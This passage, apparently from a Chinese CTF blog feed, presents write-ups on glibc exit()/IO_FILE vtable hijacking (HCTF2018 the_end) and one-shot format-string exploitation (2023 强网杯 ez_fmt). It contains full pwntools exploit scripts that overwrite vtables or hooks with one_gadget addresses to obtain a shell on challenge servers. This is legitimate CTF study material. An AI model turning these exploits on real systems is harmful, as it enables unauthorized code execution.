ends__libc_atexit:00000000003E7738</code></pre><p>fcloseall.c</p><pre class=" language-highlight c"><span class="type"><code class="language-highlight c"><span class="type">int</span>__fcloseall (<span class="type">void</span>)&#123;  <span class="comment">/* Close all streams.  */</span>  <span class="keyword">return</span> _IO_cleanup ();&#125;</code></pre><p>genops.c</p><pre class=" language-highlight c"><span class="type"><code class="language-highlight c"><span class="type">int</span>_IO_cleanup (<span class="type">void</span>)&#123;  <span class="comment">/* 刷新所有流 */</span>  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);  <span class="comment">/* 关闭所有流的缓冲区 */</span>  _IO_unbuffer_all ();  <span class="keyword">return</span> result;&#125;</code></pre><pre class=" language-highlight c"><span class="type"><code class="language-highlight c"><span class="type">int</span>_IO_flush_all_lockp (<span class="type">int</span> do_lock)&#123;  <span class="type">int</span> result = <span class="number">0</span>;  FILE *fp;<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>  _IO_cleanup_region_start_noarg (flush_cleanup);  _IO_lock_lock (list_all_lock);<span class="meta">#<span class="keyword">endif</span></span>  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp->_chain)    &#123;      run_fp = fp;      <span class="keyword">if</span> (do_lock)_IO_flockfile (fp);      <span class="keyword">if</span> (((fp->_mode <= <span class="number">0</span> && fp->_IO_write_ptr > fp->_IO_write_base)   || (_IO_vtable_offset (fp) == <span class="number">0</span>       && fp->_mode > <span class="number">0</span> && (fp->_wide_data->_IO_write_ptr    > fp->_wide_data->_IO_write_base))   )  && _IO_OVERFLOW (fp, EOF) == EOF)   <span class="comment">// --> target</span>result = EOF;      <span class="keyword">if</span> (do_lock)_IO_funlockfile (fp);      run_fp = <span class="literal">NULL</span>;    &#125;<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>  _IO_lock_unlock (list_all_lock);  _IO_cleanup_region_end (<span class="number">0</span>);<span class="meta">#<span class="keyword">endif</span></span>  <span class="keyword">return</span> result;&#125;</code></pre><pre class=" language-highlight c"><span class="type">static</span> <span class="type"><code class="language-highlight c"><span class="type">static</span> <span class="type">void</span>_IO_unbuffer_all (<span class="type">void</span>)&#123;  FILE *fp;<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>  _IO_cleanup_region_start_noarg (flush_cleanup);  _IO_lock_lock (list_all_lock);<span class="meta">#<span class="keyword">endif</span></span>  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp; fp = fp->_chain)    &#123;      <span class="type">int</span> legacy = <span class="number">0</span>;<span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span>      <span class="keyword">if</span> (__glibc_unlikely (_IO_vtable_offset (fp) != <span class="number">0</span>))legacy = <span class="number">1</span>;<span class="meta">#<span class="keyword">endif</span></span>      <span class="keyword">if</span> (! (fp->_flags & _IO_UNBUFFERED)  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span>  && (legacy || fp->_mode != <span class="number">0</span>))&#123;<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>  <span class="type">int</span> cnt;<span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span>  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt < MAXTRIES; ++cnt)    <span class="keyword">if</span> (fp->_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp->_lock) == <span class="number">0</span>)      <span class="keyword">break</span>;    <span class="keyword">else</span>      <span class="comment">/* Give the other thread time to finish up its use of the</span><span class="comment"> stream.  */</span>      __sched_yield ();<span class="meta">#<span class="keyword">endif</span></span>  <span class="keyword">if</span> (! legacy && ! dealloc_buffers && !(fp->_flags & _IO_USER_BUF))    &#123;      fp->_flags |= _IO_USER_BUF;      fp->_freeres_list = freeres_list;      freeres_list = fp;      fp->_freeres_buf = fp->_IO_buf_base;    &#125;  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);   <span class="comment">// --> target</span>  <span class="keyword">if</span> (! legacy && fp->_mode > <span class="number">0</span>)    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>  <span class="keyword">if</span> (cnt < MAXTRIES && fp->_lock != <span class="literal">NULL</span>)    _IO_lock_unlock (*fp->_lock);<span class="meta">#<span class="keyword">endif</span></span>&#125;      <span class="comment">/* Make sure that never again the wide char functions can be</span><span class="comment"> used.  */</span>      <span class="keyword">if</span> (! legacy)fp->_mode = <span class="number">-1</span>;    &#125;<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>  _IO_lock_unlock (list_all_lock);  _IO_cleanup_region_end (<span class="number">0</span>);<span class="meta">#<span class="keyword">endif</span></span>&#125;</code></pre><p>利用__IO_cleanup时，可利用的函数有_IO_flush_all_lockp与_IO_unbuffer_all</p><p>其中可以伪造_IO_flush_all_lockp中的_IO_overflow，伪造_IO_unbuffer_all中的_IO_setbufk</p><p>那么首先我们需要伪造*vtable指向一个可写地址</p><p>由于libc版本&gt;2.24，存在_IO_vtable_check</p><p>_IO_vtable_check   libioP.h</p><pre class=" language-highlight c"><span class="comment"><code class="language-highlight c"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span><span class="comment">   terminate the process.  */</span><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;<span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span><span class="comment">   the process.  */</span><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *<span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span>&#123;  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span><span class="comment">     section.  */</span>  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;  <span class="keyword">if</span> (__glibc_unlikely (offset >= section_length))    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span><span class="comment">       slow path, which will terminate the process if necessary.  */</span>    _IO_vtable_check ();  <span class="keyword">return</span> vtable;</code></pre><p>我们需要绕过if (__glibc_unlikely (offset &gt;&#x3D; section_length))的check，就需要  ptr - __start___libc_IO_vtables &gt;&#x3D; __stop___libc_IO_vtables - __start___libc_IO_vtables，即ptr要在__start___libc_IO_vtables到__stop___libc_IO_vtables之间（该范围被设置为了不可写）</p><p>那我们尝试打<strong>io_str_finish</strong></p><p>调用链子： __run_exit_handlers  –&gt; __fcloseall  –&gt;  _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_OVERFLOW（_IO_finish_t）</p><p>先用两次修改次数，来将stdout.vtable指向&amp;_IO_str_jumps-8，这样exit在调用_IO_flush_all_lockp时会执行_IO_str_finish，而不是_IO_overflow</p><p>修改((_IO_strfile *) fp)-&gt;_s._free_buffer 为 one_gadget 地址， 触发程序执行 _IO_str_finish函数就可以得到 shell，但是由于存在绕过的要求，不够写</p><pre class=" language-highlight c"><span class="type"><code class="language-highlight c"><span class="type">void</span>_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)&#123;  <span class="keyword">if</span> (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);  fp->_IO_buf_base = <span class="literal">NULL</span>;  _IO_default_finish (fp, <span class="number">0</span>);&#125;</code></pre><p>绕过：</p><blockquote><p>要满足 fp-&gt;_IO_buf_base 不为空，并且由于它作为 fp-&gt;_s._free_buffer 的第一个参数，因此可以使用 &#x2F;bin&#x2F;sh 的地址。<br>fp-&gt;_flags 要不包含_IO_USER_BUF，它的定义为 #define _IO_USER_BUF 1，即 fp-&gt;_flags 最低位为 0 。<br>缓冲区需要有数据，即 _IO_write_base &lt; _IO_write_ptr 。<br>_mode 需要小于等于 0 。</p><p>_flags &amp;&#x3D; -1</p><p>_IO_write_base &lt; _IO_write_ptr</p><p>*vtable &#x3D; &amp;_IO_str_jumps - 0x8  </p><p>_free_buffer &#x3D; one_gadget</p></blockquote><p>_IO_write_ptr 需要写一次，*vtable &#x3D; &amp;_IO_str_jumps - 0x8  需要写两次，_free_buffer &#x3D; one_gadget需要改三次，行不通</p><p>如果能有六次写的机会的话，就能打_IO_flush_all_lockp</p><p>改另一条链子 __run_exit_handlers  –&gt; __fcloseall  –&gt;  _IO_cleanup –&gt; _IO_unbuffer_all –&gt; _IO_setbuf，下面这个博客所示方法</p><p><a href="https://www.jianshu.com/p/ad0b895e5a86">2018 HCTF the_end - 简书 (jianshu.com)</a></p><p>由于原题是2.23的，所以能任意伪造vtable地址到任意地址</p><ul><li><p>利用的是在程序调用 <code>exit</code> 后，会遍历<code>_IO_list_all</code>,调用<code>_IO_2_1_stdout_</code>下的<code>vatable</code>中<code>_setbuf</code>函数.</p></li><li><p>可以先修改两个字节在当前<code>vtable</code>附近伪造一个<code>fake_vtable</code>，然后使用 3 个字节修改<code>fake_vtable</code>中<code>_setbuf</code>的内容为<code>one_gadget</code>.</p></li></ul><p>本地patch 2.23</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406102038387.png" alt="image-20240610203831160"></p><p>将vtable迁移到可写段上，我们可以改 _IO_OVERFLOW\_IO_SETBUF为one_gadget，最后执行链子1\2获取shell</p><p>设置目标作为_IO_OVERFLOW\_IO_SETBUF，通过偏移函数在虚表中的偏移来计算得到fake_vtable_addr</p><p>打_IO_SETBUF，成功执行到one_gadget了，但是栈的问题没有执行，试了几个都没用</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406102110358.png" alt="image-20240610211016997"></p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    context.log_level = <span class="string">&#x27;info&#x27;</span>    IPort = <span class="string">&#x27;node5.buuoj.cn 28004&#x27;</span>    pwnfile = <span class="string">&#x27;./the_end&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    io = init(pwnfile, IPort, libc_name)    ru(<span class="string">b&#x27;0x&#x27;</span>)    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]    <span class="comment"># one_gadget = [0x4f2c5, 0x4f322, 0x10a38c, 0xe569f, 0xe5858, 0xe585f, 0xe5863, 0x10a398]</span>    one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>, <span class="number">0xcd173</span>, <span class="number">0xcd248</span>, <span class="number">0xf03a4</span>, <span class="number">0xf03b0</span>, <span class="number">0xf1247</span>, <span class="number">0xf67f0</span>]    one = libc_base + one_gadget[<span class="number">0</span>]    ori0 = one & <span class="number">0xff</span>    ori1 = one>><span class="number">8</span> & <span class="number">0xff</span>    ori2 = one>><span class="number">16</span> & <span class="number">0xff</span>    ori3 = one>><span class="number">24</span> & <span class="number">0xff</span>    ori4 = one>><span class="number">32</span> & <span class="number">0xff</span>    leak(<span class="string">"one_gadget"</span>, one)    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori0))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori3))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori4))    stdout_vtable = libc_base + <span class="number">0x3c56f8</span>    <span class="comment">#-->fake_vtable</span>    fake_vtable_addr = libc_base + <span class="number">0x3c5588</span>  <span class="comment">#fake_vtable->0x58 =  _IO_setbuf_t</span>    setbuf = libc_base + <span class="number">0x3c55e0</span>                 leak(<span class="string">"stdout_vtable"</span>, stdout_vtable)    leak(<span class="string">"fake_vtable"</span>, fake_vtable_addr)            debug(<span class="string">"b _IO_flush_all_lockp"</span>)    s(p64(stdout_vtable))    s(p8(fake_vtable_addr&<span class="number">0xff</span>))    s(p64(stdout_vtable+<span class="number">1</span>))    s(p8(fake_vtable_addr>><span class="number">8</span>&<span class="number">0xff</span>))    s(p64(setbuf))    s(p8(ori0))    s(p64(setbuf+<span class="number">1</span>))    s(p8(ori1))    s(p64(setbuf+<span class="number">2</span>))    s(p8(ori2))    leak(<span class="string">"libc_base"</span>, libc_base)    itr()</code></pre><p>打_IO_OVERFLOW的话需要缓冲区有数据，这里需要多利用一字节修改，所以不可行。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这道题如果没开pie和RELRO可以用fini_array来打</p><p>如果能多写一字节可以利用_IO_OVERFLOW，io_str_finish</p><p>这道题涉及了exit()函数的调用链、较高版本的IO利用，是一道值得思考的题目</p><hr><h2 id="续：io-str-finish"><a href="#续：io-str-finish" class="headerlink" title="续：io_str_finish"></a>续：io_str_finish</h2><p>试试io_str_finish打，给文件打补丁，需要多写一字节来修改_IO_write_ptr指针</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111243066.png" alt="image-20240611124316929"></p><p>将0x837df404修改成0x837df405</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111246252.png" alt="image-20240611124604166"></p><p>2.27_3.1 patch</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111249308.png" alt="image-20240611124949226"></p><p>可惜one_gadget得到的gadget都用不了，试着在libc里面找也没找到合适的gadget</p><blockquote><p>_IO_2_1_stdout_{</p><p>​     _flag &amp;&#x3D; -1</p><p>​     IO_write_base &lt; IO_write_ptr</p><p>​    _IO_buf_base &#x3D; &amp;_bin_sh</p><p>​    _modle &lt;&#x3D; 0</p><p>​    *vtable &#x3D; &amp;_IO_str_jumps - 0x8   &#x3D;&#x3D;&gt;  __IO_overflow -&gt; _IO_finish_t</p><p>​     }</p><p>stdout_str_fields &#x3D; system(one_gadget)</p></blockquote><p>调用链： __run_exit_handlers  –&gt; __fcloseall  –&gt;  _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_OVERFLOW（_IO_finish_t）</p><p>如果还有个任意地址写多字节的话往_IO_buf_base &#x3D; &amp;_bin_sh</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">def</span> <span class="title function_">pwn1</span>():    dl_rtld_lock_recursive = <span class="number">0x619f60</span> + libc_base    dl_rtld_unlock_recursive  = <span class="number">0x619f68</span> + libc_base    ru(<span class="string">b&#x27; good luck ;)\n&#x27;</span>)    <span class="comment"># debug()</span>    s(p64(dl_rtld_unlock_recursive))    s(p8(ori0))    s(p64(dl_rtld_unlock_recursive+<span class="number">1</span>))    s(p8(ori1))    s(p64(dl_rtld_unlock_recursive+<span class="number">2</span>))    s(p8(ori2))    s(p64(dl_rtld_unlock_recursive+<span class="number">3</span>))    s(p8(ori3))    s(p64(dl_rtld_unlock_recursive+<span class="number">4</span>))    s(p8(ori4))<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    context.log_level = <span class="string">&#x27;info&#x27;</span>    IPort = <span class="string">&#x27;node5.buuoj.cn 28004&#x27;</span>    pwnfile = <span class="string">&#x27;./the_end_5&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    io = init(pwnfile, IPort, libc_name)    ru(<span class="string">b&#x27;0x&#x27;</span>)    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]    one_gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>, <span class="number">0xe569f</span>, <span class="number">0xe5858</span>, <span class="number">0xe585f</span>, <span class="number">0xe5863</span>, <span class="number">0x10a398</span>]    one = libc_base + one_gadget[<span class="number">7</span>]    ori0 = one & <span class="number">0xff</span>    ori1 = one>><span class="number">8</span> & <span class="number">0xff</span>    ori2 = one>><span class="number">16</span> & <span class="number">0xff</span>    ori3 = one>><span class="number">24</span> & <span class="number">0xff</span>    ori4 = one>><span class="number">32</span> & <span class="number">0xff</span>    leak(<span class="string">"one_gadget"</span>, one)    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori0))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori3))    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori4))    stdout_vtable = libc_base + <span class="number">0x3ec838</span>    <span class="comment">#-->fake_vtable</span>    stdout_free_buffer = libc_base + <span class="number">0x3ec848</span>  <span class="comment">#-->one_gadget</span>    fake_vtable = libc_base + <span class="number">0x3e8360</span> - <span class="number">8</span>    <span class="comment">#&_IO_str_jumps - 8 </span>    stdout_IO_write_ptr = libc_base + <span class="number">0x3ec788</span>        leak(<span class="string">"stdout_vtable"</span>, stdout_vtable)    leak(<span class="string">"fake_vtable"</span>, fake_vtable)    leak(<span class="string">"stdout_free_buffer"</span>, stdout_free_buffer)        <span class="comment"># debug("b _IO_flush_all_lockp")</span>    debug(<span class="string">"b _IO_str_finish"</span>)    s(p64(stdout_vtable))   <span class="comment">#改stdout_vtable -> _IO_str_jumps-8, 调用_IO_OVERFLOW时会按照0x18偏移找到_IO_str_finish</span>    s(p8(fake_vtable&<span class="number">0xff</span>))    s(p64(stdout_vtable+<span class="number">1</span>))    s(p8(fake_vtable>><span class="number">8</span>&<span class="number">0xff</span>))        s(p64(stdout_free_buffer))    s(p8(ori0))    s(p64(stdout_free_buffer+<span class="number">1</span>))    s(p8(ori1))    s(p64(stdout_free_buffer+<span class="number">2</span>))    s(p8(ori2))    s(p64(stdout_IO_write_ptr))    s(p8(<span class="number">0xff</span>))    itr()</code></pre><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111301650.png" alt="image-20240611130110444"></p><blockquote><p>libc-2.28 版本起 _IO_str_finish 不再调用 _free_buffer 而是直接是直接调用 free ，因此该方法失效。</p><p>2.34以下可以利用  IO_validate_vtable 劫持程序流，自 glibc-2.24 起在调用 vtable 中的函数前会调用 IO_validate_vtable 检查 vtable 执向的 _IO_jump_t 的地址是否合法，如果如果 rtld_active 返回 true（具体看调试，因为可能存在GLRO(dl_init_all_dirs)不可写且为 NULL 的情况）则会调用 _dl_addr，最终执行 __rtld_lock_lock_recursive (GL(dl_load_lock))   2.34失效</p></blockquote><p>参考博客：<a href="https://blog.csdn.net/qq_45323960/article/details/123810198?app_version=6.3.7&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22123810198%22,%22source%22:%22qq_74106326%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">linux IO_FILE 利用_io list all结构体-CSDN博客</a></p><p><a href="https://www.anquanke.com/post/id/243196">exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hctf2018-the-end&quot;&gt;&lt;a href=&quot;#hctf2018-the-end&quot; class=&quot;headerlink&quot; title=&quot;hctf2018_the_end&quot;&gt;&lt;/a&gt;hctf2018_the_end&lt;/h1&gt;&lt;p&gt;远程：2.27-3ubunt</summary>
      
    
    
    
    
    <category term="exit &amp; IO" scheme="http://example.com/tags/exit-IO/"/>
    
  </entry>
  
  <entry>
    <title>一次性格式化字符串利用</title>
    <link href="http://example.com/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/</id>
    <published>2024-06-08T08:43:06.000Z</published>
    <updated>2024-07-14T12:10:57.456Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一次性格式化字符串"><a href="#一次性格式化字符串" class="headerlink" title="一次性格式化字符串"></a>一次性格式化字符串</h1><h2 id="【2023-强网杯】ez-fmt"><a href="#【2023-强网杯】ez-fmt" class="headerlink" title="【2023 强网杯】ez_fmt"></a>【2023 强网杯】ez_fmt</h2><p>没开pie，开了 full Relro，改不了got和fini_array，也给了buf地址，栈上地址用偏移算</p><p>改printf_ret地址，绕过w&#x3D;&#x3D;0xffff的限制，控制程序再次执行read 0x00401205  再次执行格式化字符串</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32<span class="comment">#from ctypes import *</span><span class="comment">#from LibcSearcher import *</span>s    = <span class="keyword">lambda</span> data               : io.send(data)sa   = <span class="keyword">lambda</span> delim, data        : io.sendafter(delim,data)sl   = <span class="keyword">lambda</span> data               : io.sendline(data)sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)itr  = <span class="keyword">lambda</span>                    : io.interactive()r64  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">"&#123;&#125;:0x&#123;:x&#125;"</span>.<span class="built_in">format</span>(name,value))<span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):    gdb.attach(io,cmd)    pause()<span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">data1,data2</span>):   <span class="comment">#payload = b&#x27;%&#x27; + str(data) + b&#x27;c&#x27; + padding + &#x27;%&#x27; + str(offset) + b&#x27;$hhn&#x27; + p64(adr)</span>    padding1  = <span class="string">b&#x27;&#x27;</span>    padding2  = <span class="string">b&#x27;&#x27;</span>    data2     = data2-data1      payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span>    <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)<<span class="number">0x10</span>):        padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))        data1    -= <span class="built_in">len</span>(padding1)        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span>        <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)<<span class="number">0x10</span>):            padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))            payload1   = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span>    payload2 = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span>    <span class="built_in">print</span>(payload2)    <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)<<span class="number">0x20</span>):        padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))        data2    -= <span class="built_in">len</span>(padding2)        payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span>        <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)<<span class="number">0x20</span>):            padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))            payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span>    payload2 += p64(ret_addr) + p64(ret_addr+<span class="number">2</span>)    <span class="keyword">return</span> payload2<span class="keyword">def</span> <span class="title function_">pwn</span>():    py1 = <span class="string">b&#x27;%4198917c%9$hn%19$paaaaa&#x27;</span> + p64(printf_ret)    <span class="comment"># debug()</span>    s(py1)    ru(<span class="string">b&#x27;0x&#x27;</span>)    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span>    leak(<span class="string">"libc_base"</span> , libc_base)    one_gadget = libc_base + <span class="number">0xe3b01</span>    <span class="comment"># debug()</span>    py2 = fmt(one_gadget&<span class="number">0xffff</span>,(one_gadget>><span class="number">16</span>)&<span class="number">0xffff</span>)    s(py2)<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    pwn_log_level = <span class="string">&#x27;info&#x27;</span>       pwn_arch = <span class="string">&#x27;amd64&#x27;</span>    pwn_os = <span class="string">&#x27;linux&#x27;</span>    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]    pwnfile = <span class="string">&#x27;./ez_fmt&#x27;</span>    io = process(pwnfile)    io = remote(<span class="string">&#x27;47.104.24.40&#x27;</span>,<span class="number">1337</span>)    elf = ELF(pwnfile)    rop = ROP(pwnfile)    context.binary = pwnfile    libc_name  = <span class="string">&#x27;./libc-2.31.so&#x27;</span>    libc = ELF(libc_name)     fini_arry = <span class="number">0x0403DC0</span>    main      = elf.sym[<span class="string">&#x27;main&#x27;</span>]        ru(<span class="string">b&#x27;0x&#x27;</span>)    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)    ret_addr   = stack + <span class="number">0x68</span>    printf_ret = stack - <span class="number">0x8</span>    leak(<span class="string">"print_ret"</span>,printf_ret)    leak(<span class="string">"ret_addr"</span>,ret_addr)    pwn()    itr()</code></pre><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>自己出的练手题  没开RELRO，直接打fini_array绕过一次性格式化字符串</p><pre class=" language-highlight c"><span class="meta">#<span class="keyword">include</span><span class="string"><code class="language-highlight c"><span class="meta">#<span class="keyword">include</span><span class="string"><stdio.h></span></span><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);    <span class="keyword">return</span> <span class="number">0</span>;&#125;<span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;    init_func();    <span class="type">char</span> str[<span class="number">0x100</span>];    <span class="built_in">printf</span>(<span class="string">"please input your payload:"</span>);    read(<span class="number">0</span>, str, <span class="number">0x100</span>);    <span class="built_in">printf</span>(str);&#125;<span class="comment">//gcc fmt.c -no-pie -z norelro  -o fmt </span></code></pre><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32<span class="comment">#from ctypes import *</span><span class="comment">#from LibcSearcher import *</span><span class="comment">#from struct import pack</span>s    = <span class="keyword">lambda</span> data               : io.send(data)sl   = <span class="keyword">lambda</span> data               : io.sendline(data)sa   = <span class="keyword">lambda</span> delim, data        : 